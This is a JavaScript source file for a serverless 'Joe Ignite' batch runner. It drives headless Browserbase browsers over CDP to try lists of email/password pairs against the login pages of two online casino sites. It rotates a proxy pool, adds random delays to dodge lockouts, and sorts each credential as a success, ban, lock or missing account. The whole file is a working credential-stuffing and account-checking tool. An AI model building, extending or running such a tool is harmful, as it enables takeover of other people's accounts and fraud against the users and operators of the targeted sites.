/**
 * Joe Ignite — serverless batch runner.
 * Runs the same logic as the browser orchestrator but entirely inside a Deno
 * backend function: create BB sessions, drive each via CDP WebSocket,
 * classify outcomes, persist JoeIgniteRun records.
 *
 * Frontend polls JoeIgniteRun entity for progress.
 *
 * NOTE: Deno Deploy functions have a ~5-minute execution ceiling. Keep
 * batches modest (<= ~25 credentials at concurrency 4 is a safe rule of thumb).
 * For very large batches, use browser-orchestrated mode.
 */
import { createClientFromRequest } from 'npm:@base44/sdk@0.8.25';

const BB_BASE = 'https://api.browserbase.com/v1';
const MAX_ATTEMPTS = 3;

const SITES = {
  joe: {
    url: 'https://www.joefortunepokies.win/login',
    selectors: { username: '#username', password: '#password', submit: '#loginSubmit' },
  },
  ignition: {
    url: 'https://www.ignitioncasino.ooo/login',
    selectors: { username: '#email', password: '#login-password', submit: '#login-submit' },
  },
};
const COOKIE_SELECTORS = ['.coi-banner__accept', '.coi-banner__close', 'button[onclick*="submitAllCategories"]'];

// ── helpers ────────────────────────────────────────────────────────────────
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const jitter = (a, b) => sleep(a + Math.random() * (b - a));

function classifyOutcome({ url = '', text = '' }) {
  const u = (url || '').toLowerCase();
  const t = (text || '').toLowerCase();
  if (u.includes('/account') || u.includes('/lobby') || u.includes('/dashboard') ||
      t.includes('logout') || t.includes('sign out') || t.includes('my account')) return 'SUCCESS';
  if (t.includes('permanently') || t.includes('banned') || t.includes('closed') ||
      t.includes('terminated')) return 'PERM_BAN';
  if (t.includes('temporarily') || t.includes('locked') || t.includes('try again later') ||
      t.includes('too many attempts')) return 'TEMP_LOCK';
  if (t.includes('no account') || t.includes('does not exist') || t.includes('invalid email') ||
      t.includes('invalid username') || t.includes('incorrect email') || t.includes('user not found')) return 'NO_ACCOUNT';
  return 'CONTINUE';
}

function finalOutcomeFromResults({ joe, ignition }) {
  const values = [joe, ignition];
  if (values.includes('SUCCESS')) return 'SUCCESS';
  if (values.includes('PERM_BAN')) return 'PERM_BAN';
  if (values.includes('TEMP_LOCK')) return 'TEMP_LOCK';
  if (values.every((v) => v === 'ERROR')) return 'ERROR';
  return 'NO_ACCOUNT';
}

async function bbFetch(path, method, apiKey, body) {
  const res = await fetch(`${BB_BASE}${path}`, {
    method,
    headers: { 'X-BB-API-Key': apiKey, 'Content-Type': 'application/json' },
    body: body ? JSON.stringify(body) : undefined,
  });
  const text = await res.text();
  const data = text ? JSON.parse(text) : {};
  if (!res.ok) throw new Error(`BB ${res.status}: ${text}`);
  return data;
}

// ── CDP client over WebSocket ──────────────────────────────────────────────
class CDP {
  constructor(ws) {
    this.ws = ws;
    this.nextId = 1;
    this.pending = new Map();
    ws.addEventListener('message', (e) => {
      let msg;
      try { msg = JSON.parse(e.data); } catch { return; }
      if (msg.id && this.pending.has(msg.id)) {
        const { resolve, reject } = this.pending.get(msg.id);
        this.pending.delete(msg.id);
        if (msg.error) reject(new Error(msg.error.message));
        else resolve(msg.result);
      }
    });
  }
  send(method, params = {}, sessionId) {
    const id = this.nextId++;
    return new Promise((resolve, reject) => {
      this.pending.set(id, { resolve, reject });
      const payload = { id, method, params };
      if (sessionId) payload.sessionId = sessionId;
      this.ws.send(JSON.stringify(payload));
      setTimeout(() => {
        if (this.pending.has(id)) { this.pending.delete(id); reject(new Error(`timeout ${method}`)); }
      }, 30000);
    });
  }
  close() { try { this.ws.close(); } catch {} }
}

function openCDP(connectUrl) {
  return new Promise((resolve, reject) => {
    const ws = new WebSocket(connectUrl);
    const t = setTimeout(() => reject(new Error('CDP connect timeout')), 15000);
    ws.addEventListener('open', () => { clearTimeout(t); resolve(new CDP(ws)); });
    ws.addEventListener('error', () => { clearTimeout(t); reject(new Error('CDP connect error')); });
  });
}

async function attach(cdp, targetId) {
  const { sessionId } = await cdp.send('Target.attachToTarget', { targetId, flatten: true });
  return sessionId;
}

async function getOrCreatePage(cdp) {
  const { targetInfos } = await cdp.send('Target.getTargets');
  const existing = targetInfos.find((t) => t.type === 'page');
  if (existing) return existing.targetId;
  const { targetId } = await cdp.send('Target.createTarget', { url: 'about:blank' });
  return targetId;
}

async function navigate(cdp, sessionId, url) {
  await cdp.send('Page.enable', {}, sessionId);
  await cdp.send('Page.navigate', { url }, sessionId);
  await sleep(3000);
}

async function evaluate(cdp, sessionId, expression) {
  const { result } = await cdp.send('Runtime.evaluate', {
    expression, returnByValue: true, awaitPromise: true,
  }, sessionId);
  return result?.value;
}

async function dismissCookies(cdp, sessionId) {
  const expr = `(() => {
    const sels = ${JSON.stringify(COOKIE_SELECTORS)};
    for (const s of sels) { const el = document.querySelector(s); if (el) { el.click(); return true; } }
    return false;
  })()`;
  try { await evaluate(cdp, sessionId, expr); } catch {}
  await jitter(300, 600);
}

async function fillAndSubmit(cdp, sessionId, selectors, email, password, overwrite) {
  const fill = `(() => {
    const set = (sel, val) => {
      const el = document.querySelector(sel);
      if (!el) return false;
      const setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
      el.focus();
      if (${overwrite}) { el.select?.(); }
      setter.call(el, val);
      el.dispatchEvent(new Event('input',  { bubbles: true }));
      el.dispatchEvent(new Event('change', { bubbles: true }));
      return true;
    };
    set(${JSON.stringify(selectors.username)}, ${JSON.stringify(email)});
    set(${JSON.stringify(selectors.password)}, ${JSON.stringify(password)});
    return true;
  })()`;
  await evaluate(cdp, sessionId, fill);
  await jitter(60, 140);
  const submit = `(() => { const b = document.querySelector(${JSON.stringify(selectors.submit)}); if (b) { b.click(); return true; } return false; })()`;
  await evaluate(cdp, sessionId, submit);
}

async function readState(cdp, sessionId) {
  const expr = `({ url: location.href, text: (document.body && document.body.innerText || '').slice(0, 8000) })`;
  return (await evaluate(cdp, sessionId, expr)) || { url: '', text: '' };
}

// ── process one credential ─────────────────────────────────────────────────
async function processCredential({ cred, batchId, apiKey, projectId, base44, proxy }) {
  const rowPatch = {
    batchId, email: cred.email, status: 'running',
    attempts: 0, startedAt: new Date().toISOString(),
  };
  const existing = await base44.asServiceRole.entities.JoeIgniteRun.filter({ batchId, email: cred.email });
  const rowId = existing[0]?.id;
  if (rowId) await base44.asServiceRole.entities.JoeIgniteRun.update(rowId, rowPatch);

  let sessionId = null;
  let results = { joe: null, ignition: null };
  let attempts = 0;
  let status = 'error';
  const details = [];

  try {
    const sessionBody = {
      projectId,
      browserSettings: { viewport: { width: 1366, height: 768 } },
      userMetadata: { launchedFrom: 'BBCommandCenter', testRun: 'joe_ignite', task: 'login-verify', email: cred.email, batchId, proxyId: proxy?.id },
    };
    if (proxy) {
      const p = { type: 'external', server: proxy.server };
      if (proxy.username) p.username = proxy.username;
      if (proxy.password) p.password = proxy.password;
      sessionBody.proxies = [p];
    }
    const session = await bbFetch('/sessions', 'POST', apiKey, sessionBody);
    sessionId = session.id;
    if (rowId) await base44.asServiceRole.entities.JoeIgniteRun.update(rowId, { sessionId });

    const cdp = await openCDP(session.connectUrl);
    try {
      const joeTargetId = await getOrCreatePage(cdp);
      const { targetId: ignTargetId } = await cdp.send('Target.createTarget', { url: 'about:blank' });
      const joeSess = await attach(cdp, joeTargetId);
      const ignSess = await attach(cdp, ignTargetId);

      const run = async (siteKey, sess, attempt) => {
        const cfg = SITES[siteKey];
        try {
          if (attempt === 1) {
            await navigate(cdp, sess, cfg.url);
            await dismissCookies(cdp, sess);
            await jitter(300, 600);
          }
          await fillAndSubmit(cdp, sess, cfg.selectors, cred.email, cred.password, attempt > 1);
          await jitter(1500, 2500);
          return classifyOutcome(await readState(cdp, sess));
        } catch { return 'ERROR'; }
      };

      for (attempts = 1; attempts <= MAX_ATTEMPTS; attempts++) {
        const [joeRes, ignRes] = await Promise.all([
          run('joe', joeSess, attempts),
          run('ignition', ignSess, attempts),
        ]);
        results = { joe: joeRes, ignition: ignRes };
        details.push(`Attempt ${attempts}: joe=${joeRes} ign=${ignRes}`);
        if (rowId) await base44.asServiceRole.entities.JoeIgniteRun.update(rowId, {
          attempts, joeOutcome: joeRes, ignitionOutcome: ignRes,
        });
        if (['SUCCESS', 'PERM_BAN', 'TEMP_LOCK'].some((o) => joeRes === o || ignRes === o)) break;
        if (attempts < MAX_ATTEMPTS) await jitter(2000, 3000);
      }
    } finally {
      cdp.close();
    }

    status = finalOutcomeFromResults(results).toLowerCase();
  } catch (err) {
    details.push(`FATAL: ${err.message}`);
    status = 'error';
  } finally {
    if (sessionId) { try { await bbFetch(`/sessions/${sessionId}`, 'POST', apiKey, { projectId, status: 'REQUEST_RELEASE' }); } catch {} }
  }

  const isBurned = status === 'success' || status === 'perm_ban';
  const finalPatch = {
    sessionId, status, attempts,
    joeOutcome: results.joe, ignitionOutcome: results.ignition,
    isBurned, details: details.join(' | '),
    endedAt: new Date().toISOString(),
  };
  if (rowId) await base44.asServiceRole.entities.JoeIgniteRun.update(rowId, finalPatch);
  else await base44.asServiceRole.entities.JoeIgniteRun.create({ batchId, email: cred.email, ...finalPatch });

  // Update proxy usage stats
  if (proxy?.id) {
    const isSuccess = status === 'success';
    try {
      await base44.asServiceRole.entities.ProxyPool.update(proxy.id, {
        timesUsed: (proxy.timesUsed || 0) + 1,
        successCount: (proxy.successCount || 0) + (isSuccess ? 1 : 0),
        failureCount: (proxy.failureCount || 0) + (isSuccess ? 0 : 1),
        lastUsedAt: new Date().toISOString(),
      });
    } catch {}
  }
}

// ── handler ────────────────────────────────────────────────────────────────
Deno.serve(async (req) => {
  try {
    const base44 = createClientFromRequest(req);
    const user = await base44.auth.me();
    if (!user) return Response.json({ error: 'Unauthorized' }, { status: 401 });

    const { credentials, concurrency = 4, batchId, projectId } = await req.json();
    const apiKey = Deno.env.get('Api_key');
    if (!apiKey) return Response.json({ error: 'Api_key secret not configured' }, { status: 400 });
    if (!projectId) return Response.json({ error: 'projectId required' }, { status: 400 });
    if (!Array.isArray(credentials) || credentials.length === 0) {
      return Response.json({ error: 'credentials required' }, { status: 400 });
    }

    // Pre-create all rows as "queued" so the frontend can see them immediately.
    await Promise.all(credentials.map((c) =>
      base44.asServiceRole.entities.JoeIgniteRun.create({
        batchId, email: c.email, status: 'queued', attempts: 0,
      })
    ));

    // Load proxy pool (enabled only) for round-robin assignment
    const allProxies = await base44.asServiceRole.entities.ProxyPool.list('-created_date', 500);
    const proxyPool = allProxies.filter((p) => p.enabled !== false && p.server);
    let proxyCursor = 0;
    const nextProxy = () => {
      if (proxyPool.length === 0) return null;
      const p = proxyPool[proxyCursor % proxyPool.length];
      proxyCursor++;
      return p;
    };

    // Return immediately so the client isn't blocked; run workers in background.
    const queue = credentials.map((c) => ({ cred: c, proxy: nextProxy() }));
    const workers = Array.from({ length: Math.max(1, Math.min(concurrency, 8)) }, async () => {
      while (queue.length) {
        const item = queue.shift();
        if (!item) return;
        try { await processCredential({ cred: item.cred, batchId, apiKey, projectId, base44, proxy: item.proxy }); }
        catch (err) { console.error(`row failed ${item.cred.email}: ${err.message}`); }
      }
    });

    // Fire-and-forget (Deno keeps it alive until all resolve or function times out).
    Promise.all(workers).catch((e) => console.error('batch error', e));

    return Response.json({ ok: true, batchId, queued: credentials.length });
  } catch (err) {
    return Response.json({ error: err.message }, { status: 500 });
  }
});